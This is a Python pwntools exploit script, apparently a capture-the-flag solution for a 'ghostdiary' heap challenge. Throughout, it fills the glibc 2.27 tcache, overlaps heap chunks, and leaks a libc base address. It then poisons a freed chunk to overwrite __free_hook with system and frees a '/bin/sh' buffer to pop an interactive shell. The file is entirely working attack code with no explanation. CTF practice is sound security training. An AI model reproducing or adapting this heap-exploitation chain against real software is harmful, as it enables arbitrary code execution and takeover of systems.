from pwn import *

def add(side, size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(side))
    sock.sendlineafter("size: ", str(size))
    sock.recvuntil("page #")
    return int(sock.recvline())

def write(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("Page: ", str(index))
    sock.sendlineafter("Content: ", data)
    return

def read(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("Page: ", str(index))
    sock.recvuntil("Content: ")
    return sock.recvline(keepends=False)

def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("Page: ", str(index))
    return

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc_main_arena = 0x3ebc40
libc_one_gadget = 0x10a38c

path = "/problems/ghost-diary_3_79b47a93e884f13bbc2640b2e8606676"
elf = ELF("{}/ghostdiary".format(path))
sock = process("{}/ghostdiary".format(path), cwd=path)
#elf = ELF("./ghostdiary")
#sock = process("./ghostdiary")

# prepare
a = add(1, 0x88)  # 0
b = add(1, 0x68)  # 1
c = add(2, 0x118) # 2
d = add(1, 0x10)  # 3

# fill tcache (0x118, 0x68, 0x18, 0xf8)
ofs = 4
for i in range(7):
    add(1, 0x18)  # 4 + 2i
    add(2, 0x1d8) # 5 + 2i
for i in range(7):
    write(4 + 2*i, "A"*0x18)
    delete(4 + 2*i)
    delete(5 + 2*i)
for i in range(7):
    add(1, 0x88) # 4-10
for i in range(7):
    delete(ofs+i)
#for i in range(7):
#    add(1, 0x68) # 4-10
#for i in range(7):
#    delete(ofs+i)
for i in range(7):
    add(1, 0x10) # 4-10
for i in range(7):
    delete(ofs+i)

# chunk overlap
delete(a)
payload = 'B' * 0x60 + p64(0x100)
write(b, payload)
payload = 'A' * 0xf0
payload += p64(0x100) + p64(0x21)
payload += '\n'
write(c, payload)
#_ = raw_input()
delete(c)

# libc leak
target = add(1, 0xd8)
libc_base = u64(read(target) + '\0\0') - libc_main_arena - 592
print("libc base = " + hex(libc_base))

# fastbin corruption attack
delete(b)
payload = b'A' * 0x80
payload += p64(0x90) + p64(0x70)
payload += p64(libc_base + libc.symbols['__free_hook'])
payload += '\n'
write(target, payload)
binsh = add(1, 0x68)
free_hook = add(1, 0x68)
payload = p64(libc_base + libc.symbols['system'])
payload += '\n'
write(free_hook, payload)

# get the shell!
write(binsh, '/bin/sh\n')
delete(binsh)

sock.interactive()
